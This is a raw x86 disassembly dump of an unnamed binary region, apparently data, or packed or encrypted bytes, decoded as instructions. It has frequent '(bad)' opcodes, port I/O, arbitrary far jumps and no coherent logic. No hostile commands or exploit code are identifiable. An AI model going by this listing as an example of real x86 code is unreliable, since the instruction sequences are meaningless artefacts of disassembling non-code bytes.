  41ce92:	inc    ecx
  41ce93:	mov    esi,cs
  41ce95:	lea    esi,[ebp-0x2]
  41ce98:	idiv   BYTE PTR [ebx-0x96bdf29]
  41ce9e:	stc    
  41ce9f:	pop    esi
  41cea0:	int3   
  41cea1:	and    eax,0x98d24890
  41cea6:	shl    DWORD PTR [edx+0x7e],1
  41cea9:	rcl    dl,0xd5
  41ceac:	pop    ecx
  41cead:	and    ecx,DWORD PTR [eax-0x37]
  41ceb0:	lea    edi,[esi+0x79edd78a]
  41ceb6:	xchg   ebx,eax
  41ceb7:	jg     0x41ce4d
  41ceb9:	in     al,0xc8
  41cebb:	xchg   edi,eax
  41cebc:	xchg   edx,eax
  41cebd:	aam    0xb8
  41cebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cec0:	or     ebx,ecx
  41cec2:	int3   
  41cec3:	and    dh,BYTE PTR [eax]
  41cec5:	sub    esi,DWORD PTR [edi-0x22361d27]
  41cecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cecc:	cld    
  41cecd:	xor    ebx,DWORD PTR [eax]
  41cecf:	dec    edx
  41ced0:	dec    ebx
  41ced1:	inc    eax
  41ced2:	dec    ebx
  41ced3:	clc    
  41ced4:	fs stos DWORD PTR es:[edi],eax
  41ced6:	lods   eax,DWORD PTR ds:[esi]
  41ced7:	outs   dx,BYTE PTR ds:[esi]
  41ced8:	lahf   
  41ced9:	sbb    DWORD PTR [ebx+0x75001555],ebx
  41cedf:	retf   
  41cee0:	sub    DWORD PTR [edi+0x23331013],ecx
  41cee6:	mov    DWORD PTR [ebx-0x69a5d81c],ecx
  41ceec:	repnz loope 0x41cf0a
  41ceef:	int3   
  41cef0:	retf   0x572c
  41cef3:	(bad)  
  41cef4:	cmp    eax,0x28b93aea
  41cef9:	leave  
  41cefa:	mov    eax,ds:0x362022a3
  41ceff:	lds    ebx,FWORD PTR [ebx]
  41cf01:	or     DWORD PTR [eax+0x78],0xfffffff3
  41cf05:	sbb    al,0xf6
  41cf07:	std    
  41cf08:	iret   
  41cf09:	jmp    0x41ce9e
  41cf0b:	cmp    al,0xf9
  41cf0d:	pusha  
  41cf0e:	aad    0xa6
  41cf10:	mov    ?,edx
  41cf12:	add    eax,DWORD PTR [eax+0x60654857]
  41cf18:	pop    ebx
  41cf19:	jecxz  0x41cf58
  41cf1b:	lds    esp,FWORD PTR [eax]
  41cf1d:	jne    0x41ceae
  41cf1f:	rcr    BYTE PTR [ecx+eax*1+0x54],0xfe
  41cf24:	push   ss
  41cf25:	mov    edi,0x23d2e70b
  41cf2a:	pop    es
  41cf2b:	mov    bl,0x24
  41cf2d:	rcl    DWORD PTR [eax+0x66ccb997],1
  41cf33:	mov    es,edx
  41cf35:	sbb    DWORD PTR [edi-0x7c2ead6b],edx
  41cf3b:	cmp    eax,0xd49fa2cd
  41cf40:	in     eax,0xe7
  41cf42:	popa   
  41cf43:	int    0x87
  41cf45:	cmp    ebx,edi
  41cf47:	sbb    ah,BYTE PTR [ebx]
  41cf49:	test   BYTE PTR [esi],0x44
  41cf4c:	dec    esi
  41cf4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf4f:	stos   BYTE PTR es:[edi],al
  41cf50:	adc    DWORD PTR [ecx],ecx
  41cf52:	test   DWORD PTR [edx+0x5c],ebx
  41cf55:	lods   eax,DWORD PTR ds:[esi]
  41cf56:	imul   edx,ebp,0xffffff86
  41cf59:	inc    ebx
  41cf5a:	mov    dl,0x99
  41cf5c:	pushf  
  41cf5d:	(bad)  
  41cf5e:	dec    ebx
  41cf5f:	not    DWORD PTR [esp+edi*4]
  41cf62:	jne    0x41cf1c
  41cf64:	(bad)  
  41cf65:	loop   0x41cfd0
  41cf67:	xlat   BYTE PTR ds:[ebx]
  41cf68:	or     BYTE PTR [ebx],dl
  41cf6a:	pop    edi
  41cf6b:	cmp    eax,0x74e0e7e9
  41cf70:	mov    DWORD PTR [edi*4+0x722ac760],eax
  41cf77:	pop    edx
  41cf78:	mov    edi,0xee3a1f0f
  41cf7d:	popf   
  41cf7e:	or     cl,BYTE PTR [edx+0x7b]
  41cf81:	mov    ah,0xf8
  41cf83:	aad    0xb2
  41cf85:	xchg   esp,eax
  41cf86:	fcmovu st,st(4)
  41cf88:	push   es
  41cf89:	mov    BYTE PTR ds:0x640e56f4,ch
  41cf8f:	(bad)  
  41cf90:	popf   
  41cf91:	stos   DWORD PTR es:[di],eax
  41cf93:	and    eax,0x401fe5b6
  41cf98:	xor    bh,dh
  41cf9a:	popf   
  41cf9b:	loope  0x41cf6e
  41cf9d:	scas   al,BYTE PTR es:[edi]
  41cf9e:	pop    ebp
  41cf9f:	mov    dl,0x59
  41cfa1:	mov    WORD PTR [eax-0x4981d0eb],es
  41cfa7:	cmp    BYTE PTR ds:0x4decab38,al
  41cfad:	ret    
  41cfae:	or     eax,0xc3c627f9
  41cfb3:	mov    ecx,0x6d119da1
  41cfb8:	imul   bx,cx,0xffb7
  41cfbc:	xor    al,0x54
  41cfbe:	mov    bl,0xa5
  41cfc0:	fmul   QWORD PTR [edx+edx*8]
  41cfc3:	sub    BYTE PTR [ebx],ah
  41cfc5:	sub    al,0x7c
  41cfc7:	xor    al,0xd7
  41cfc9:	int3   
  41cfca:	xor    BYTE PTR [esi-0x3b],0xb8
  41cfce:	jecxz  0x41cfab
  41cfd0:	ss mov di,0xe692
  41cfd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfd6:	add    dh,BYTE PTR [edx-0x34314688]
  41cfdc:	and    DWORD PTR [ebp+0x7b20d479],eax
  41cfe2:	pop    ebp
  41cfe3:	and    DWORD PTR [edx],edx
  41cfe5:	sti    
  41cfe6:	lea    eax,[ebp-0x3f]
  41cfe9:	inc    ebx
  41cfea:	mov    bh,0xa6
  41cfec:	lods   al,BYTE PTR ds:[esi]
  41cfed:	sbb    DWORD PTR [ecx-0x4f2e9539],ebp
  41cff3:	(bad)  
  41cff4:	out    dx,al
  41cff5:	mov    eax,0xee867f93
  41cffa:	mov    BYTE PTR [esi],bl
  41cffc:	call   0xe2e7:0x421814fd
  41d003:	rcr    BYTE PTR [edx],1
  41d005:	fldenv [ebx]
  41d007:	ja     0x41d06a
  41d009:	pop    ds
  41d00a:	lods   al,BYTE PTR ds:[esi]
  41d00b:	cld    
  41d00c:	push   edx
  41d00d:	bound  eax,QWORD PTR [ebp-0x7f2b3a25]
  41d013:	sub    BYTE PTR [eax-0x73eaad97],cl
  41d019:	xlat   BYTE PTR ds:[ebx]
  41d01a:	dec    edx
  41d01b:	fidivr WORD PTR [esp+ebx*8+0x73b10294]
  41d022:	jmp    0x41cff2
  41d024:	xchg   ah,bl
  41d026:	mov    ds:0x21e3760b,al
  41d02b:	add    ebp,eax
  41d02d:	ins    BYTE PTR es:[edi],dx
  41d02e:	lods   al,BYTE PTR ds:[esi]
  41d02f:	sbb    eax,0xaa918eaa
  41d034:	rcr    BYTE PTR [ebp+0x6ec42be5],cl
  41d03a:	jp     0x41cfbd
  41d03c:	out    dx,eax
  41d03d:	stc    
  41d03e:	pop    eax
  41d03f:	mov    ecx,0x7d9d22ce
  41d044:	jno    0x41d01d
  41d046:	push   0x53
  41d048:	pop    es
  41d049:	mov    dl,0x79
  41d04b:	imul   ecx,esp,0xb3cbe25b
  41d051:	rol    ebx,0xb4
  41d054:	pop    ss
  41d055:	inc    ebx
  41d056:	rcr    DWORD PTR [ebx+ecx*1-0x30],cl
  41d05a:	mov    esp,DWORD PTR [ebx+0x22c2bb70]
  41d060:	aad    0x36
  41d062:	cmp    BYTE PTR [ecx-0x4b],cl
  41d065:	fsubr  DWORD PTR [ecx-0x2cc61aee]
  41d06b:	call   0xdeb3be2f
  41d070:	mov    dl,0x58
  41d072:	mov    ds:0x136dc50f,al
  41d077:	xor    DWORD PTR [edx-0x133dbaf2],eax
  41d07d:	inc    ebp
  41d07e:	aaa    
  41d07f:	dec    esp
  41d080:	gs ja  0x41d015
  41d083:	mov    edi,0x27649e9f
  41d088:	(bad)  
  41d089:	fwait
  41d08a:	add    DWORD PTR [edi-0x52772042],esi
  41d090:	imul   ebx,eax,0x1a
  41d093:	adc    BYTE PTR [esi-0x54],0x2f
  41d097:	jmp    0x41d045
  41d099:	and    BYTE PTR [edi-0x1],bl
  41d09c:	mov    ebp,ss
  41d09e:	mov    ah,0x5f
  41d0a0:	push   0xffffffd7
  41d0a2:	in     al,0xe6
  41d0a4:	pop    edi
  41d0a5:	call   0xebc8:0x639888f2
  41d0ac:	mov    edi,0xc3645347
  41d0b1:	fistp  DWORD PTR [edx+0x16]
  41d0b4:	xchg   ebp,eax
  41d0b5:	out    dx,eax
  41d0b6:	fsubr  QWORD PTR [esi]
  41d0b8:	dec    ecx
  41d0b9:	sbb    DWORD PTR [ecx],edx
  41d0bb:	jecxz  0x41d09f
  41d0bd:	lds    ecx,FWORD PTR [edi]
  41d0bf:	sub    esp,eax
  41d0c1:	cmp    al,0x40
  41d0c3:	jmp    0x41d0d1
  41d0c5:	mov    edx,0x26ac2fb0
  41d0ca:	inc    ecx
  41d0cb:	inc    ebp
  41d0cc:	pop    eax
  41d0cd:	sub    ebp,DWORD PTR [esi+edx*1]
  41d0d0:	dec    eax
  41d0d1:	add    BYTE PTR [edx-0x8c3d78f],cl
  41d0d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0d8:	pusha  
  41d0d9:	retf   
  41d0da:	popa   
  41d0db:	xchg   esp,eax
  41d0dc:	or     al,0x73
  41d0de:	dec    edi
  41d0df:	sub    DWORD PTR [edi-0x63],0x61638cd4
  41d0e6:	std    
  41d0e7:	test   esp,ebx
  41d0e9:	xor    DWORD PTR [edi],esp
  41d0eb:	aam    0x6a
  41d0ed:	rcl    BYTE PTR [esi+0x2b],1
  41d0f0:	in     al,dx
  41d0f1:	add    eax,esp
  41d0f3:	sbb    BYTE PTR [esi+0x44],cl
  41d0f6:	xchg   ecx,eax
  41d0f7:	test   DWORD PTR [ebp+0x15c4eaa6],ecx
  41d0fd:	push   eax
  41d0fe:	xchg   al,ah
  41d100:	jno    0x41d159
  41d102:	cmc    
  41d103:	or     BYTE PTR [ebx+esi*8+0x68e8befb],0x61
  41d10b:	stos   BYTE PTR es:[edi],al
  41d10c:	jbe    0x41d125
  41d10e:	pop    DWORD PTR [ebx-0x1b625d52]
  41d114:	jg     0x41d0cd
  41d116:	inc    edx
  41d117:	and    ecx,ebx
  41d119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d11a:	retf   
  41d11b:	mov    esp,0xb16c18cc
  41d120:	ror    BYTE PTR [ebp+0x77eb821e],1
  41d126:	jns    0x41d0ef
  41d128:	pop    edx
  41d129:	into   
  41d12a:	sub    eax,0xf3a16b51
  41d12f:	sar    BYTE PTR [ebx],cl
  41d131:	pop    ss
  41d132:	aaa    
  41d133:	jmp    0x41d141
  41d135:	sub    al,0x70
  41d137:	hlt    
  41d138:	out    dx,eax
  41d139:	mov    ds:0xb061c6f0,eax
  41d13e:	dec    esp
  41d13f:	add    al,0xe3
  41d141:	repnz sub al,0xc
  41d144:	sti    
  41d145:	loop   0x41d190
  41d147:	push   bp
  41d149:	sbb    al,ch
  41d14b:	je     0x41d187
  41d14d:	cmp    dl,dh
  41d14f:	xor    BYTE PTR [ecx-0x1d],al
  41d152:	and    eax,DWORD PTR [ebp+0x6be3e345]
  41d158:	jnp    0x41d171
  41d15a:	neg    DWORD PTR [edx-0x2d]
  41d15d:	or     eax,0xe9916af9
  41d162:	outs   dx,DWORD PTR ds:[si]
  41d164:	stos   BYTE PTR es:[edi],al
  41d165:	sub    al,0x40
  41d167:	data16 fild WORD PTR [ebx+0x75]
  41d16b:	cmp    ecx,DWORD PTR [ebx+0x5bce504d]
  41d171:	pop    ebp
  41d172:	sub    al,0x3a
  41d174:	ds aas 
  41d176:	les    ebp,FWORD PTR [eax-0x4844c5df]
  41d17c:	rcl    DWORD PTR ds:0xc2af2743,1
  41d182:	imul   edi,DWORD PTR [ecx],0xb6ebaac0
  41d188:	dec    ecx
  41d189:	bound  ebp,QWORD PTR [esi-0x4a]
  41d18c:	psubusw mm7,QWORD PTR [bp+di]
  41d190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d191:	int    0x47
  41d193:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d194:	cmp    BYTE PTR [ebx-0x9],0xfd
  41d198:	aas    
  41d199:	push   0xa14a9f1f
  41d19e:	add    BYTE PTR [ebx],al
  41d1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1a1:	dec    ebp
  41d1a2:	cmc    
  41d1a3:	dec    eax
  41d1a4:	cld    
  41d1a5:	cmp    al,0xa9
  41d1a7:	shl    DWORD PTR [edi+ebx*1],cl
  41d1aa:	cmp    esi,edi
  41d1ac:	lea    esi,[esi]
  41d1ae:	push   ebx
  41d1af:	(bad)
  41d1b2:	imul   esp,DWORD PTR [edi-0x41],0xd7973e08
  41d1b9:	xor    DWORD PTR [ecx+0x22bb3eec],ebp
  41d1bf:	clc    
  41d1c0:	sti    
  41d1c1:	cmp    cl,BYTE PTR [edx-0x56d79617]
  41d1c7:	mov    esi,0x2a0eca62
  41d1cc:	push   es
  41d1cd:	loope  0x41d1ca
  41d1cf:	cmp    DWORD PTR [ecx-0xe635ae0],edx
  41d1d5:	sub    esp,esi
  41d1d7:	add    eax,0xbbe7e242
  41d1dc:	and    ch,ch
  41d1de:	(bad)  
  41d1df:	in     al,0x52
  41d1e1:	(bad)  
  41d1e3:	ds in  eax,dx
  41d1e5:	mov    al,0xc9
  41d1e7:	inc    ecx
  41d1e8:	loop   0x41d204
  41d1ea:	sub    ebx,DWORD PTR [eax-0x24]
  41d1ed:	xchg   DWORD PTR [esi+0x823b90f],edx
  41d1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1f4:	and    eax,0x4e5d1649
  41d1f9:	(bad)  
  41d1fb:	aam    0x24
  41d1fd:	jge    0x41d217
  41d1ff:	daa    
  41d200:	pop    eax
  41d201:	(bad)  
  41d202:	(bad)  
  41d203:	ja     0x41d237
  41d205:	xchg   edi,eax
  41d206:	jne    0x41d24a
  41d208:	fwait
  41d209:	sbb    bl,bh
  41d20b:	sahf   
  41d20c:	xor    BYTE PTR [ebx+ebx*4],dh
  41d20f:	jns    0x41d219
  41d211:	enter  0xc437,0x4e
  41d215:	retf   0x31f7
  41d218:	dec    esi
  41d219:	mov    ebp,0x20136aec
  41d21e:	pushf  
  41d21f:	imul   esp,esi,0xffffffc2
  41d222:	and    cl,0x2e
  41d225:	arpl   WORD PTR [esi],bx
  41d227:	adc    DWORD PTR [ebp-0x3d],edi
  41d22a:	cdq    
  41d22b:	cwde   
  41d22c:	ins    BYTE PTR es:[edi],dx
  41d22d:	jbe    0x41d256
  41d22f:	mov    ebp,0x6eb7ef7a
  41d234:	mov    dl,0x79
  41d236:	mov    eax,0x4727dae2
  41d23b:	fcmovbe st,st(1)
  41d23d:	pushf  
  41d23e:	and    BYTE PTR [esp+esi*1+0x2b],0x66
  41d243:	fld    DWORD PTR [esi+edi*8]
  41d246:	popf   
  41d247:	mov    cl,0xe7
  41d249:	jl     0x41d282
  41d24b:	add    eax,DWORD PTR [ebx]
  41d24d:	push   ss
  41d24e:	fdiv   QWORD PTR [ebx+0x6f]
  41d251:	push   0xffffff80
  41d253:	cs test al,0x34
  41d256:	imul   ebp,ebp,0x3b
  41d259:	loop   0x41d2af
  41d25b:	add    eax,0xed42086f
  41d260:	jp     0x41d24f
  41d262:	lds    ebp,FWORD PTR [ecx]
  41d264:	outs   dx,BYTE PTR ds:[esi]
  41d265:	cdq    
  41d266:	dec    edi
  41d267:	scas   eax,DWORD PTR es:[edi]
  41d268:	(bad)  
  41d269:	lock dec ebx
  41d26b:	iret   
  41d26c:	mov    ecx,0xe7c65253
  41d271:	pop    ebx
  41d272:	or     DWORD PTR [ebx],edi
  41d274:	push   0xffffffde
  41d276:	push   ss
  41d277:	rcr    DWORD PTR ds:0x6290b1f0,1
  41d27d:	jmp    0x41d2b6
  41d27f:	jae    0x41d276
  41d281:	test   BYTE PTR [edx-0x20f4c14e],dh
  41d287:	sub    eax,0x64a3f62c
  41d28c:	xchg   esi,eax
  41d28d:	mov    ch,0xd7
  41d28f:	scas   al,BYTE PTR es:[edi]
  41d290:	in     eax,dx
  41d291:	lahf   
  41d292:	ss sub edx,eax
  41d295:	add    eax,0xf6fba802
  41d29a:	fldcw  WORD PTR [ecx-0x7f]
  41d29d:	mov    ch,BYTE PTR [esi+0x7a]
  41d2a0:	scas   al,BYTE PTR es:[edi]
  41d2a1:	and    al,dl
  41d2a3:	fistp  QWORD PTR [edx-0x23c009e5]
  41d2a9:	adc    al,0x21
  41d2ab:	leave  
  41d2ac:	push   edx
  41d2ad:	in     eax,0x93
  41d2af:	test   eax,0x292f345a
  41d2b4:	fsub   QWORD PTR [esi-0x6f]
  41d2b7:	mov    ebx,0xcea45845
  41d2bc:	inc    esi
  41d2bd:	lds    esp,FWORD PTR [edx]
  41d2bf:	jp     0x41d331
  41d2c1:	mov    ah,0xa6
  41d2c3:	lods   eax,DWORD PTR fs:[esi]
  41d2c5:	sbb    al,ch
  41d2c7:	xor    eax,0x59cc56a0
  41d2cc:	les    esp,FWORD PTR [edi-0x80]
  41d2cf:	int3   
  41d2d0:	mov    ds:0x8be71c53,eax
  41d2d5:	push   esp
  41d2d6:	pop    edx
  41d2d7:	inc    ebp
  41d2d8:	jno    0x41d27b
  41d2da:	mov    edx,0xa14fad53
  41d2df:	lods   al,BYTE PTR ds:[esi]
  41d2e0:	mov    ebx,0xa59ae95b
  41d2e5:	into   
  41d2e6:	nop
  41d2e7:	int3   
  41d2e8:	mov    esi,0x5eb15a2a
  41d2ed:	sbb    al,0x90
  41d2ef:	test   eax,0xe6287928
  41d2f4:	outs   dx,DWORD PTR ds:[esi]
  41d2f5:	xor    eax,edx
  41d2f7:	or     BYTE PTR [edi-0x2c883b4e],dh
  41d2fd:	adc    eax,0xbfa3a01c
  41d302:	jnp    0x41d374
  41d304:	mov    esi,edi
  41d306:	ja     0x41d2be
  41d308:	xor    bh,dl
  41d30a:	(bad)  
  41d30b:	jae    0x41d301
  41d30d:	(bad)  
  41d30f:	jmp    0x4605:0x20c81089
  41d316:	dec    ebx
  41d317:	iret   
  41d318:	add    ebx,DWORD PTR [eax+0x5b]
  41d31b:	ins    DWORD PTR es:[edi],dx
  41d31c:	sbb    bh,BYTE PTR [edx*1-0x2c4bf711]
  41d323:	pop    es
  41d324:	mov    WORD PTR [ebx-0x6920ef19],?
  41d32a:	cmp    ebx,DWORD PTR [eax]
  41d32c:	inc    ecx
  41d32d:	ret    
  41d32e:	(bad)  
  41d32f:	(bad)  
  41d330:	xor    al,0x73
  41d332:	loope  0x41d2b9
  41d334:	clc    
  41d335:	loopne 0x41d35a
  41d337:	and    eax,0xdb3f8e95
  41d33c:	inc    ebx
  41d33d:	pop    ds
  41d33e:	inc    ecx
  41d33f:	mov    ah,0x26
  41d341:	fst    st(6)
  41d343:	in     eax,0x4b
  41d345:	dec    edx
  41d346:	ja     0x41d34e
  41d348:	lods   eax,DWORD PTR ds:[esi]
  41d349:	adc    ebp,DWORD PTR [ecx]
  41d34b:	aam    0x82
  41d34d:	inc    ebp
  41d34e:	push   ss
  41d34f:	cmp    al,0x7d
  41d351:	and    edx,0xeceaa3f8
  41d357:	mov    WORD PTR [edi],cs
  41d359:	add    DWORD PTR [esi+0x4273ec71],eax
  41d35f:	fistp  WORD PTR [ebx+0x2e]
  41d362:	xchg   ecx,eax
  41d363:	or     ch,cl
  41d365:	inc    esi
  41d366:	fistp  DWORD PTR [edi]
  41d368:	cmp    dl,dl
  41d36a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41d36c:	ret    
  41d36d:	aaa    
  41d36e:	or     al,0x5e
  41d370:	push   edx
  41d371:	or     ch,ah
  41d373:	push   ecx
  41d374:	and    ecx,ebx
  41d376:	int3   
  41d377:	push   ss
  41d378:	js     0x41d388
  41d37a:	xchg   edx,eax
  41d37b:	popf   
  41d37c:	pop    es
  41d37d:	xchg   edx,eax
  41d37e:	dec    ecx
  41d37f:	sbb    eax,0xe36f567e
  41d384:	data16 fst QWORD PTR [edi+0x1f129f14]
  41d38b:	sbb    BYTE PTR [edx-0x441ac2d0],cl
  41d391:	inc    ebx
  41d392:	(bad)
  41d395:	les    ecx,FWORD PTR [edi+0x39]
  41d398:	mov    eax,ds:0xcc5c766d
  41d39d:	aaa    
  41d39e:	iret   
  41d39f:	dec    ebx
  41d3a0:	cs dec esp
  41d3a2:	add    DWORD PTR [ebp-0xd],ebp
  41d3a5:	xchg   edx,eax
  41d3a6:	adc    DWORD PTR [ebx+0x183fcafa],edx
  41d3ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3ad:	lahf   
  41d3ae:	jmp    0x41d34a
  41d3b0:	mov    edi,0x55419782
  41d3b5:	jnp    0x41d426
  41d3b7:	lock cwde 
  41d3b9:	add    eax,0xfeebc1d5
  41d3be:	push   edi
  41d3bf:	push   eax
  41d3c0:	fnsetpm(287 only) 
  41d3c2:	xchg   DWORD PTR [ebx+0xe36b439],edx
  41d3c8:	and    DWORD PTR [ecx+0x52],ebx
  41d3cb:	leave  
  41d3cc:	or     DWORD PTR [ebx+esi*8-0x24],esp
  41d3d0:	or     eax,DWORD PTR ds:0xcb5d35d9
  41d3d6:	and    ah,BYTE PTR [edx]
  41d3d8:	loopne 0x41d3de
  41d3da:	xchg   ebp,eax
  41d3db:	stos   BYTE PTR es:[edi],al
  41d3dc:	stos   DWORD PTR es:[edi],eax
  41d3dd:	or     bh,BYTE PTR [eax-0x38]
  41d3e0:	les    ebx,FWORD PTR [edx]
  41d3e2:	retf   0xc210
  41d3e5:	sbb    ah,BYTE PTR [eax-0x653adfaf]
  41d3eb:	je     0x41d3a4
  41d3ed:	js     0x41d37a
  41d3ef:	mov    DWORD PTR [esi+0x15],esi
  41d3f2:	pushf  
  41d3f3:	jo     0x41d453
  41d3f5:	xchg   esi,eax
  41d3f6:	int3   
  41d3f7:	mov    eax,ds:0xd6d86685
  41d3fc:	fwait
  41d3fd:	adc    bh,cl
  41d3ff:	rcl    BYTE PTR [ebx+0x75],0x8f
  41d403:	fs mov ah,0xbd
  41d406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d407:	out    0xb5,eax
  41d409:	and    ecx,DWORD PTR [esi+0x6]
  41d40c:	sub    eax,0xd62f109d
  41d411:	mul    BYTE PTR [eax]
  41d413:	sbb    al,0x2e
  41d415:	and    cl,BYTE PTR [edi]
  41d417:	ficomp DWORD PTR [esi]
  41d419:	and    al,0x54
  41d41b:	nop
  41d41c:	enter  0x86ec,0x51
  41d420:	rcr    ecx,1
  41d422:	xchg   ebx,eax
  41d423:	mov    ss,WORD PTR [ebp+0x6b]
  41d426:	cmp    al,BYTE PTR [ecx-0x7e7f9c70]
  41d42c:	lds    ecx,FWORD PTR [ebp+ebx*2+0x1a74d4d2]
  41d433:	add    DWORD PTR [ebp+0x795e56d2],ebp
  41d439:	fsubr  st(1),st
  41d43b:	dec    edx
  41d43c:	repnz sti 
  41d43e:	stos   BYTE PTR es:[edi],al
  41d43f:	mov    dh,bl
  41d441:	cdq    
  41d442:	push   0xffffffd9
  41d444:	push   cs
  41d445:	pop    ds
  41d446:	inc    edi
  41d447:	ins    DWORD PTR es:[edi],dx
  41d448:	fdiv   DWORD PTR ds:[edx+0x29]
  41d44c:	mov    ds:0x431205cf,eax
  41d451:	sahf   
  41d452:	nop
  41d453:	jbe    0x41d465
  41d455:	pushf  
  41d456:	paddw  mm1,QWORD PTR [ecx+0x7437fb02]
  41d45d:	push   0x37
  41d45f:	push   0xfffffff6
  41d461:	es xchg ebp,eax
  41d463:	je     0x41d427
  41d465:	mov    al,ds:0xbf1cce2a
  41d46a:	mov    ds:0xe0bc1953,eax
  41d46f:	cmp    BYTE PTR ds:0x1ea5c1e,dh
  41d475:	xchg   ebx,eax
  41d476:	jge    0x41d46f
  41d478:	cmp    al,0x2f
  41d47a:	jo     0x41d409
  41d47c:	mov    eax,0xde917d9
  41d481:	push   edi
  41d482:	lods   al,BYTE PTR ds:[esi]
  41d483:	push   es
  41d484:	aam    0x2b
  41d486:	cmp    eax,0x12c205a4
  41d48b:	ja     0x41d419
  41d48d:	inc    esp
  41d48e:	nop
  41d48f:	gs adc eax,0xa2c4645a
  41d495:	add    BYTE PTR [edx+0x2c],bl
  41d498:	inc    ebx
  41d499:	cmp    eax,0xb1c5cfb7
  41d49e:	pushf  
  41d49f:	cdq    
  41d4a0:	push   es
  41d4a1:	push   ecx
  41d4a2:	add    DWORD PTR [bp+0x2ef8],edx
  41d4a7:	aam    0x9e
  41d4a9:	cld    
  41d4aa:	mov    ah,0xc4
  41d4ac:	xor    BYTE PTR [ecx-0x5a],bl
  41d4af:	sbb    DWORD PTR [eax+edi*1],esp
  41d4b2:	mov    ds:0x6db9b04a,eax
  41d4b7:	or     eax,0x1a3dc38b
  41d4bc:	mov    BYTE PTR [ebp+0x722b8802],al
  41d4c2:	retf   0x26e
  41d4c5:	ret    0x9785
  41d4c8:	ins    BYTE PTR es:[edi],dx
  41d4c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4ca:	add    eax,0x68ec8f5e
  41d4cf:	sub    bh,BYTE PTR [esi-0x609900a]
  41d4d5:	out    0xc1,al
  41d4d7:	ss repnz gs push esp
  41d4db:	(bad)  
  41d4dc:	xlat   BYTE PTR ds:[ebx]
  41d4dd:	iret   
  41d4de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4df:	sbb    ebx,DWORD PTR ds:0xea82a01c
  41d4e5:	aam    0xcd
  41d4e7:	pop    edx
  41d4e8:	pop    ecx
  41d4e9:	mov    DWORD PTR [eax+eiz*4],ecx
  41d4ec:	inc    ebp
  41d4ed:	add    al,0xd5
  41d4ef:	jmp    0x486706d1
  41d4f4:	and    ecx,DWORD PTR [ecx]
  41d4f6:	adc    al,0x4d
  41d4f8:	shl    BYTE PTR [ebx+0x6],cl
  41d4fb:	cld    
  41d4fc:	inc    ecx
  41d4fd:	pop    ecx
  41d4fe:	fisttp WORD PTR [edi+0x5cea12fc]
  41d504:	std    
  41d505:	sub    al,0xd0
  41d507:	ret    
  41d508:	inc    eax
  41d509:	xchg   ebp,eax
  41d50a:	mov    WORD PTR [eax],gs
  41d50c:	jmp    0x264a:0xeb6a8713
  41d513:	cmc    
  41d514:	sub    al,BYTE PTR [ecx-0xff6fe44]
  41d51a:	adc    al,0xcb
  41d51c:	(bad)  
  41d51d:	sub    al,0xfc
  41d51f:	push   0xd71706d9
  41d524:	adc    DWORD PTR [edi+0x6d],ebx
  41d527:	add    esi,ebp
  41d529:	mov    dl,0x27
  41d52b:	inc    DWORD PTR [ecx+0x5688e144]
  41d531:	ficomp DWORD PTR [edx]
  41d533:	push   ecx
  41d534:	loope  0x41d576
  41d536:	(bad)  
  41d538:	fs imul edx,edx,0x1730d24b
  41d53f:	push   ds
  41d540:	xor    ch,bl
  41d542:	hlt    
  41d543:	dec    edx
  41d544:	repz in eax,0x27
  41d547:	fidiv  WORD PTR [ebx+0x2e8ef5e0]
  41d54d:	jp     0x41d54c
  41d54f:	scas   eax,DWORD PTR es:[edi]
  41d550:	sub    DWORD PTR [eax-0x36a62c62],esp
  41d556:	or     ebp,ecx
  41d558:	add    bl,ah
  41d55a:	mov    ecx,0xced3a5f8
  41d55f:	xor    bh,BYTE PTR [eax-0xed93fad]
  41d565:	scas   eax,DWORD PTR es:[edi]
  41d566:	add    esi,DWORD PTR [esi]
  41d568:	mov    dl,0x86
  41d56a:	loopne 0x41d520
  41d56c:	sahf   
  41d56d:	push   ss
  41d56e:	push   ss
  41d56f:	mov    al,ds:0xe61fe609
  41d574:	add    edx,edx
  41d576:	push   es
  41d577:	js     0x41d5ad
  41d579:	mov    ebx,0xffca3f2
  41d57e:	psubusw mm4,QWORD PTR [ebp-0xc9c9068]
  41d585:	adc    eax,DWORD PTR [esi]
  41d587:	adc    BYTE PTR [ebx],dl
  41d589:	fimul  WORD PTR ds:0xd16b2ab1
  41d58f:	and    al,0xcc
  41d591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d592:	pop    esi
  41d593:	cmp    BYTE PTR [edi+0x245f2077],0x80
  41d59a:	(bad)  
  41d59b:	(bad)  
  41d59c:	jns    0x41d57f
  41d59e:	ja     0x41d585
  41d5a0:	add    BYTE PTR [esi],0x8b
  41d5a3:	pusha  
  41d5a4:	mov    al,ds:0xdaebc174
  41d5a9:	and    ebp,edx
  41d5ab:	cmp    DWORD PTR [ebx],edi
  41d5ad:	(bad)  
  41d5ae:	xor    BYTE PTR [ebp-0x1a7213a1],dh
  41d5b4:	xchg   bl,ch
  41d5b6:	idiv   BYTE PTR [ebx]
  41d5b8:	inc    eax
  41d5b9:	popf   
  41d5ba:	push   esi
  41d5bb:	jge    0x41d585
  41d5bd:	hlt    
  41d5be:	pusha  
  41d5bf:	xor    eax,0x3e327ec2
  41d5c4:	mov    ds:0xf662630f,eax
  41d5c9:	jge    0x41d590
  41d5cb:	popf   
  41d5cc:	cmp    DWORD PTR [ebp-0x1d],eax
  41d5cf:	sbb    bh,BYTE PTR [eax]
  41d5d1:	dec    edi
  41d5d2:	mov    al,ds:0x717e0361
  41d5d7:	cld    
  41d5d8:	cwde   
  41d5d9:	sti    
  41d5da:	add    al,0xd9
